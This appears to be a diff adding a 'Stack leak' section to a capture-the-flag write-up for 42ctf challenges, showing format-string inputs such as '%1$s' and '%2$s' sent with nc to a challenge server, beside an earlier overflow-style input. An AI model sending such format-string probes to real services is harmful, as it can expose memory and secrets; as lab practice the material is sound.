@@ -11,3 +11,20 @@ $ (x=40; while [ $x -gt 0 ]; do echo -n "A"; x=$(( $x - 1 )); done; echo -n "*";
 
 $ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc challenges.42ctf.org 3003
 ```
+## Stack leak
+```r
+$ nc challenges.42ctf.org 3006
+What is the flag?
+%3%s        
+%s is not the flag!
+
+$ nc challenges.42ctf.org 3006
+What is the flag?
+%1$s
+%1$s is not the flag!
+
+$ nc challenges.42ctf.org 3006
+What is the flag?
+%2$s    
+(null) is not the flag! 
+```
